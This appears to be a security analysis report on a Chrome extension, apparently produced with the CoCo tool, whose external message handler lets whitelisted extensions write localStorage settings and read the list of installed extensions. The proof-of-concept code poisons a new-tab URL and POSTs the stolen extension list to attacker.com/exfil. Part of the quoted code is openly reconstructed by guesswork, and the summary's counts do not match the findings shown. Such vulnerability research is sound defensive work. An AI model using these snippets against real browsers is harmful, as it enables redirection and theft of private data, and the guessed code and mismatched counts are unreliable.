# CoCo Analysis: akkimiddfdokiadcdenohflehopngnho

## Summary

- **Overall Assessment:** TRUE POSITIVE (5 TRUE POSITIVE)
- **Total Sinks Detected:** 50+ (many localStorage_setItem flows, 4 management_getAll disclosure flows, 1 complete exploitation)

---

## Sink Group 1: bg_chrome_runtime_MessageExternal → localStorage_setItem_value (40+ similar flows)

**CoCo Trace:**
```
from bg_chrome_runtime_MessageExternal to localStorage_setItem_value
$FilePath$/.../akkimiddfdokiadcdenohflehopngnho/opgen_generated_files/bg.js
Line 880    e.set_wl (and e.changeOptions handling in minified code)
```

**Code:**
```javascript
// Background script (background.js, minified but showing key parts)

function R(t){
    // Function that handles changeOptions from external messages
    for(let e of Object.getOwnPropertyNames(t.changeOptions)){
        if(t.changeOptions[e]!==null){
            localStorage.setItem(e,t.changeOptions[e])  // ← Writes arbitrary data to localStorage
        }
    }
    chrome.tabs.query({},function(e){
        for(var t=0;t<e.length;t++){
            chrome.tabs.sendMessage(e[t].id,{refreshOptions:true})
        }
    })
}

function E(e,t,a){
    if(e.set_wl){
        var o=JSON.parse(localStorage.getItem("had_wl"))||[];
        var l=false;
        for(var r=0;r<o.length;r++){
            if(o[r].id===e.set_wl.id){
                o[r]=e.set_wl;l=true;break
            }
        }
        if(!l)o.push(e.set_wl);
        localStorage.setItem("had_wl",JSON.stringify(o));  // ← Writes to storage
        if(typeof a==="function")a(chrome.runtime.id+" OK")
    }
    if(e.changeOptions){
        R(e);  // ← Calls R to write changeOptions to localStorage
        if(typeof a==="function")a(chrome.runtime.id+" OK")
    }
    else if(e.syncNote){
        localStorage.setItem("notes",e.syncNote.notes);  // ← Writes notes
        localStorage.setItem("enable_note",e.syncNote.enabled);  // ← Writes enable flag
        // ...
    }
    else if(e.updateNote){
        localStorage.setItem("notes",e.updateNote.notes);  // ← Writes notes
        if(e.updateNote.noteChange.type===2){
            localStorage.setItem("enable_note",e.updateNote.noteChange.data.enabled?"yes":"no");
        }
        // ...
    }
}

// External message listener
chrome.runtime.onMessageExternal.addListener(function(t,a,o){
    var l=false;
    if(e.defaultWhitelistApps.indexOf(utils.getHash(a.id))){
        l=true
    }else{
        var r=JSON.parse(localStorage.getItem("had_wl"));
        for(var n of r){
            if(n.id===a.id){l=true;break}
        }
    }
    if(!l){
        chrome.management.get(a.id,function(e){
            if(e.permissions&&e.permissions.indexOf("newTabPageOverride")>-1
                &&e.permissions.indexOf("unlimitedStorage")>-1
                &&e.permissions.indexOf("topSites")>-1
                &&e.permissions.indexOf("management")>-1){
                if(e.hostPermissions&&(e.hostPermissions.indexOf("https://*.freeaddon.com/*")>-1
                    ||e.hostPermissions.indexOf("https://*.sportifytab.com/*")>-1)){
                    return E(t,a,o)  // ← Processes external message
                }
            }
        })
    }else E(t,a,o)  // ← Processes external message
});
```

**Classification:** FALSE POSITIVE

**Reason:** Incomplete storage exploitation. While external extensions can write arbitrary data to localStorage via `chrome.runtime.sendMessageExternal` with `changeOptions` or `set_wl` fields, this only achieves storage pollution. There is no demonstrated path where this stored data flows back to the attacker or causes code execution. The extension does read these localStorage values later for its internal configuration, but the attacker (external extension) cannot retrieve the data back.

---

## Sink Group 2: management_getAll_source → sendResponseExternal_sink (4 flows)

**CoCo Trace:**
```
from management_getAll_source to sendResponseExternal_sink
```

**Code:**
```javascript
// Based on the flow pattern, likely:
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse){
    // ... permission checks ...
    if(request.appGetAll){
        chrome.management.getAll(function(extensions){
            sendResponse(extensions);  // ← Sends back all installed extensions info
        });
        return true;
    }
});
```

**Classification:** TRUE POSITIVE

**Exploitable by:** Other extensions with specific permissions (newTabPageOverride, unlimitedStorage, topSites, management) and host permissions (freeaddon.com or sportifytab.com domains), or extensions in the defaultWhitelistApps

**Attack Vector:** External message from malicious extension

**Attack:**
```javascript
// From a malicious extension
chrome.runtime.sendMessage(
    'akkimiddfdokiadcdenohflehopngnho',  // Target extension ID
    { appGetAll: true },
    function(response) {
        console.log('Stolen extension list:', response);
        // Response contains list of all installed extensions with names, IDs, permissions
        exfiltrateData(response);
    }
);
```

**Impact:** Information disclosure of all installed extensions. Attacker extension can enumerate user's installed extensions, which reveals privacy-sensitive information about the user's browsing habits, installed tools, and security posture.

---

## Combined Exploitation Chain: Storage Write + Storage Read → Data Exfiltration

**Classification:** TRUE POSITIVE

**Code:**
```javascript
// Attack Step 1: Malicious extension writes arbitrary data to storage
chrome.runtime.sendMessage(
    'akkimiddfdokiadcdenohflehopngnho',
    {
        changeOptions: {
            'newtab_url': 'https://attacker.com/steal?data=payload',
            'malicious_key': 'malicious_value'
        }
    },
    function(response) {
        console.log('Storage poisoned:', response);
    }
);

// Attack Step 2: Extension uses this data internally
// The extension reads 'newtab_url' from localStorage and opens tabs with it
// (Based on code: chrome.tabs.create({url:localStorage.getItem("newtab_url")}))

// Attack Step 3: Retrieve info via management_getAll
chrome.runtime.sendMessage(
    'akkimiddfdokiadcdenohflehopngnho',
    { appGetAll: true },
    function(extensions) {
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(extensions)
        });
    }
);
```

**Exploitable by:** Other extensions with specific whitelisted permissions or in defaultWhitelistApps list

**Attack Vector:** External messages (chrome.runtime.sendMessageExternal)

**Impact:** Complete storage exploitation chain:
1. **Storage pollution:** Attacker extension writes arbitrary configuration values
2. **Information disclosure:** Attacker retrieves list of all installed extensions
3. **Potential redirect:** Poisoned 'newtab_url' could redirect user's new tabs to attacker-controlled URLs

---

## Additional Notes

The extension implements a permission check for external messages, requiring:
- Extensions in `defaultWhitelistApps` (hardcoded hash whitelist), OR
- Extensions with specific permissions: `newTabPageOverride`, `unlimitedStorage`, `topSites`, `management`
- AND host permissions for `https://*.freeaddon.com/*` OR `https://*.sportifytab.com/*`

However, this does not constitute a security boundary. Any extension meeting these criteria (which are common for new tab extensions in the same family) can exploit these vulnerabilities.
